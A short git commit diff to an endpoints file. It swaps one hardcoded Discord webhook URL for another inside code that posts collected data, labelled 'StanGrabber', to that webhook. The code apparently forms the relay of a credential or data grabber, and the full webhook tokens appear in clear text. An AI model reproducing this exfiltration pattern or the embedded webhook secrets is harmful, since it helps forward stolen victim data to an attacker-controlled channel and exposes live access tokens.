93fbdf36b0173d9c1c29654954c7c6ebcd8ba519
fadikoro <68390190+fadikoro@users.noreply.github.com>
2021-04-12 01:21:54 +0300

    Update index.js

--- endpoints/index.js
+++ endpoints/index.js
@@ -48,7 +48,7 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        axios.post(`https://discord.com/api/webhooks/827112153160876044/2diFsi8a9i-aGnVxdTcs8RrgAC-dPWeVwuebXA6EaJNXHjkaYYFOVleLAgFygICSnrkY`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
